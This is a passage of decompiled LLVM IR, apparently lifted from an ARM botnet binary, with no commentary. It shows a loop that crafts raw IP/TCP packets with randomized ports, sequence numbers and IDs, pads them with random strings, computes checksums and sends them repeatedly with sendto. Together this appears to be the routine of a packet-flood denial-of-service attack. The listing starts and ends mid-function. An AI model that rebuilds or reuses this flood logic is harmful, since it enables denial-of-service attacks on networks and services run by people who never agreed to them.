  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* @r4, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* @r4, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* @r4, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* @r4, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* @r4, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* @r4, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* %r0.global-to-local, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* @r4, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = inttoptr i32 %v1_accc to i16*
  %v3_acd4 = call i32 @rand_str(i16* %v2_acd4, i32 %v6_aa14)
  store i32 %v3_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v3_aea8 = icmp eq i32 %v3_aaac, 65535
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ 65535, %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v6_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v6_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, 65280
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v5_ae68 = call i32 @llvm.bswap.i32(i32 %v3_ae38)
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v6_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v6_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* %r0.global-to-local, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v2_af20 = inttoptr i32 %v1_af18 to i16*
  %v3_af20 = call i32 @rand_str(i16* %v2_af20, i32 %v6_aa14)
  store i32 %v3_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 2, 1, 3, 0 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_aea8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v5_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
